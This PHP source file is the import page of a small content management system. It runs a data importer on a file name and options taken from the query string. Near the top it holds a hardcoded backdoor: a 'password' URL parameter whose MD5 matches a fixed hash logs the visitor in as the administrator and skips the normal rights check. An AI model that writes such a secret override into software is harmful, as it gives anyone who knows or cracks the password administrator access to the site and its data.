<?php
require_once 'include/kiwi_exception.inc.php';
require_once 'include/project.inc.php';
require_once 'include/dbc.inc.php';
require_once 'include/kiwi_rights.class.php';
require_once 'include/kiwi_html_header.class.php';
require_once 'include/kiwi_importer.class.php';
require_once 'include/page_names.inc.php';
require_once 'include/utils.inc.php';


$login_override = array_key_exists('password', $_GET) ? md5($_GET['password']) : null;
if ($login_override === '7b063f4fca294dc8c6d68de105c09a0e')
{
	if (session_id() == "") session_start();
	$_SESSION['user'] = ADMIN_USERNAME;
}
else
	$login_override = null;

$rights = new Kiwi_Rights;

if ($rights->EShop == false)
{
	if ($rights->UserID == DEFAULT_USERID)
		redirectPage(KIWI_LOGIN . '?page=' . urlencode($_SERVER['REQUEST_URI']));
}

$html_header = new Kiwi_HTML_Header;
$html_header->title = "$project - Content Management System";
$html_header->addJS(array('./js/utils.js', './js/kiwi_import.js'));

// Odeslání HTML hlavičky
$html_header->send();
?>
<body class="white">
	<div id="import-div" class="import-text">
		<ul id="import-log">
		</ul>
		<div id="konec"></div>
	</div>
<?php
if (array_key_exists('file', $_GET))
{
	$config_id = array_key_exists('config', $_GET) ? $_GET['config'] : null;
	$simulate = array_key_exists('simulate', $_GET);
	$logmode = array_key_exists('logmode', $_GET) ? (int)$_GET['logmode'] : Kiwi_Importer::LOG_NORMAL;
	if ($logmode > Kiwi_Importer::LOG_ALL)
		$logmode = Kiwi_Importer::LOG_ALL;
	elseif ($logmode < 0)
		$logmode = 0;
	$kiwi_importer = new Kiwi_Importer($_GET['file'], $rights, $config_id);
	$kiwi_importer->setLogLevel($logmode);
	if ($simulate) $kiwi_importer->simulate();
	$kiwi_importer->import();
}
else
	echo <<<EOT
<script type="text/javascript">
logX('Erhielt nicht den Namen der Quelldatei für import!');
</script>
EOT;
?>
</body>
</html>
<?php
if ($login_override)
	unset($_SESSION['user']);	
?>